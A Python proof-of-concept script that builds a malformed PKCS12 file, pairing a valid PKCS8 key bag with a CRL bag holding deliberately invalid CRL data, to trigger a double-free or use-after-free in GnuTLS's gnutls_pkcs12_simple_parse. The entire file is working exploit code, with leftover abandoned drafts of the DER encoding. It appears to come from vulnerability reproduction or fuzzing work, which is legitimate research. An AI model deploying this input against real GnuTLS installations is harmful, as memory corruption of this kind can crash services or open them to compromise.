#!/usr/bin/env python3
"""Generate a PKCS12 PoC that triggers a double-free/use-after-free in gnutls_pkcs12_simple_parse."""

from pyasn1.type import univ, tag
from pyasn1.codec.der import encoder

DATA_OID = "1.2.840.113549.1.7.1"
BAG_PKCS8_KEY_OID = "1.2.840.113549.1.12.10.1.1"
BAG_CRL_OID = "1.2.840.113549.1.12.10.1.4"

def make_safe_bag(bag_id_oid, bag_value_inner):
    """Create a SafeBag = SEQUENCE { bagId, bagValue [0] EXPLICIT ANY }"""
    safe_bag = univ.Sequence()
    safe_bag.setComponentByPosition(0, univ.ObjectIdentifier(bag_id_oid))
    # bagValue [0] EXPLICIT
    bag_val = univ.Any(bag_value_inner).subtype(
        explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0)
    )
    safe_bag.setComponentByPosition(1, bag_val)
    return encoder.encode(safe_bag)

def make_safe_contents(bags_der):
    """SafeContents ::= SEQUENCE OF SafeBag"""
    sc = univ.Sequence()
    for i, b in enumerate(bags_der):
        sc.setComponentByPosition(i, b)
    return encoder.encode(sc)

def make_content_info(content_der):
    """ContentInfo ::= SEQUENCE { contentType, content [0] EXPLICIT }"""
    ci = univ.Sequence()
    ci.setComponentByPosition(0, univ.ObjectIdentifier(DATA_OID))
    content_octet = univ.OctetString(content_der).subtype(
        explicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatConstructed, 0)
    )
    ci.setComponentByPosition(1, content_octet)
    return encoder.encode(ci)

def make_authenticated_safe(content_infos_der):
    """AuthenticatedSafe ::= SEQUENCE OF ContentInfo"""
    aseq = univ.Sequence()
    for i, ci in enumerate(content_infos_der):
        aseq.setComponentByPosition(i, ci)
    return encoder.encode(aseq)

def make_pfx(auth_safe_der):
    """PFX ::= SEQUENCE { version, authSafe }"""
    pfx = univ.Sequence()
    pfx.setComponentByPosition(0, univ.Integer(3))
    pfx.setComponentByPosition(1, auth_safe_der)
    return encoder.encode(pfx)

# Build a minimal PKCS8 private key that will import successfully
# We need a valid PKCS8 DER structure
# PKCS8 = SEQUENCE { version INTEGER, privateKeyAlgorithmIdentifier AlgorithmIdentifier,
#                    privateKey OCTET STRING }
# AlgorithmIdentifier for RSA: SEQUENCE { oid 1.2.840.113549.1.1.1, params NULL }
# The privateKey OCTET STRING contains RSAPrivateKey

# Let's use a minimal RSA private key
# RSAPrivateKey ::= SEQUENCE {
#   version INTEGER,
#   modulus INTEGER,
#   publicExponent INTEGER,
#   privateExponent INTEGER,
#   prime1 INTEGER,
#   prime2 INTEGER,
#   exponent1 INTEGER,
#   exponent2 INTEGER,
#   coefficient INTEGER
# }

# We'll use small values that will parse correctly
rsa_key = univ.Sequence()
rsa_key.setComponentByPosition(0, univ.Integer(0))  # version
rsa_key.setComponentByPosition(1, univ.Integer(0x10001))  # modulus (65537)
rsa_key.setComponentByPosition(2, univ.Integer(3))  # publicExponent
rsa_key.setComponentByPosition(3, univ.Integer(0x10001))  # privateExponent
rsa_key.setComponentByPosition(4, univ.Integer(257))  # prime1
rsa_key.setComponentByPosition(5, univ.Integer(257))  # prime2
rsa_key.setComponentByPosition(6, univ.Integer(1))  # exponent1
rsa_key.setComponentByPosition(7, univ.Integer(1))  # exponent2
rsa_key.setComponentByPosition(8, univ.Integer(1))  # coefficient
rsa_key_der = encoder.encode(rsa_key)

# AlgorithmIdentifier
alg_id = univ.Sequence()
alg_id.setComponentByPosition(0, univ.ObjectIdentifier("1.2.840.113549.1.1.1"))  # rsaEncryption
alg_id.setComponentByPosition(1, univ.Null(""))
alg_id_der = encoder.encode(alg_id)

# PKCS8
pkcs8 = univ.Sequence()
pkcs8.setComponentByPosition(0, univ.Integer(0))  # version
pkcs8.setComponentByPosition(1, alg_id_der)  # This needs to be the raw DER, but pyasn1 expects components
# Actually let's build it differently - use raw DER construction
pkcs8_der = encoder.encode(univ.Sequence().setComponentByPosition(0, univ.Integer(0)))
# Actually let's just build the whole thing manually with proper DER

# Let me use a simpler approach - build DER manually
def der_encode_tag(tag_class, tag_number, length, content):
    """Encode a DER TLV."""
    if tag_class == 0 and tag_number == 0x10:  # Universal SEQUENCE
        tag_byte = 0x30
    elif tag_class == 0 and tag_number == 2:  # Universal INTEGER
        tag_byte = 0x02
    elif tag_class == 0 and tag_number == 5:  # Universal NULL
        tag_byte = 0x05
    elif tag_class == 0 and tag_number == 6:  # Universal OID
        tag_byte = 0x06
    elif tag_class == 0 and tag_number == 4:  # Universal OCTET STRING
        tag_byte = 0x04
    elif tag_class == 2 and tag_number == 0:  # Context [0]
        tag_byte = 0xA0
    else:
        raise ValueError(f"Unknown tag: class={tag_class}, number={tag_number}")
    
    if length < 128:
        return bytes([tag_byte, length]) + content
    else:
        # Long form length
        len_bytes = length.to_bytes((length.bit_length() + 7) // 8, 'big')
        return bytes([tag_byte, 0x80 | len(len_bytes)]) + len_bytes + content

def der_encode_sequence(contents):
    return der_encode_tag(0, 0x10, len(contents), contents)

def der_encode_integer(value):
    if value == 0:
        return bytes([0x02, 0x01, 0x00])
    # Convert to bytes, handle sign
    if value > 0:
        b = value.to_bytes((value.bit_length() + 7) // 8, 'big')
        if b[0] & 0x80:
            b = b'\x00' + b
        return bytes([0x02, len(b)]) + b
    else:
        # Negative - not needed
        pass

def der_encode_oid(oid_str):
    parts = [int(x) for x in oid_str.split('.')]
    if len(parts) < 2:
        raise ValueError("OID must have at least 2 components")
    encoded = bytes([40 * parts[0] + parts[1]])
    for p in parts[2:]:
        if p < 128:
            encoded += bytes([p])
        else:
            # Encode as base-128
            bytes_list = []
            while p > 0:
                bytes_list.insert(0, p & 0x7f)
                p >>= 7
            for i in range(len(bytes_list) - 1):
                bytes_list[i] |= 0x80
            encoded += bytes(bytes_list)
    return bytes([0x06, len(encoded)]) + encoded

def der_encode_null():
    return bytes([0x05, 0x00])

def der_encode_octet_string(content):
    return der_encode_tag(0, 4, len(content), content)

def der_encode_explicit_tag0(content):
    """[0] EXPLICIT"""
    return bytes([0xA0, len(content)]) + content

# Build PKCS8 private key
# AlgorithmIdentifier
alg_id_der = der_encode_sequence(
    der_encode_oid("1.2.840.113549.1.1.1") +
    der_encode_null()
)

# RSAPrivateKey with minimal valid values
rsa_key_der = der_encode_sequence(
    der_encode_integer(0) +  # version
    der_encode_integer(0x10001) +  # modulus
    der_encode_integer(3) +  # publicExponent
    der_encode_integer(0x10001) +  # privateExponent
    der_encode_integer(257) +  # prime1
    der_encode_integer(257) +  # prime2
    der_encode_integer(1) +  # exponent1
    der_encode_integer(1) +  # exponent2
    der_encode_integer(1)  # coefficient
)

# PKCS8
pkcs8_key_der = der_encode_sequence(
    der_encode_integer(0) +  # version
    alg_id_der +
    der_encode_octet_string(rsa_key_der)
)

# Build CRL bag value (pkcs-12-CRLBag)
# CRLBag ::= SEQUENCE { crlId OBJECT IDENTIFIER, crlValue [0] EXPLICIT ANY }
# The crlValue should contain a DER-encoded X.509 CRL
# We'll put invalid data that will fail gnutls_x509_crl_import

# For the CRL bag, we need the bag value to be a valid CRLBag structure
# that decodes correctly, but the inner crlValue contains invalid CRL DER
# that causes gnutls_x509_crl_import to fail

# Invalid CRL data - just some random bytes that won't parse as a valid CRL
invalid_crl_der = bytes([0x30, 0x02, 0x01, 0x01])  # SEQUENCE { INTEGER 1 } - not a valid CRL

crl_bag_value = der_encode_sequence(
    der_encode_oid("1.2.840.113549.1.9.23.1") +  # crlId = x509Crl (id-crlTypes 1)
    der_encode_explicit_tag0(invalid_crl_der)  # crlValue [0] EXPLICIT
)

# Build SafeBags
bag1 = make_safe_bag(BAG_PKCS8_KEY_OID, pkcs8_key_der)
bag2 = make_safe_bag(BAG_CRL_OID, crl_bag_value)

# Build SafeContents
safe_contents = make_safe_contents([bag1, bag2])

# Build ContentInfo
content_info = make_content_info(safe_contents)

# Build AuthenticatedSafe
auth_safe = make_authenticated_safe([content_info])

# Build PFX
pfx_der = make_pfx(auth_safe)

# Write output
with open('/workspace/poc.p12', 'wb') as f:
    f.write(pfx_der)

print(f"Generated PoC: {len(pfx_der)} bytes")
print(f"Hex: {pfx_der.hex()}")
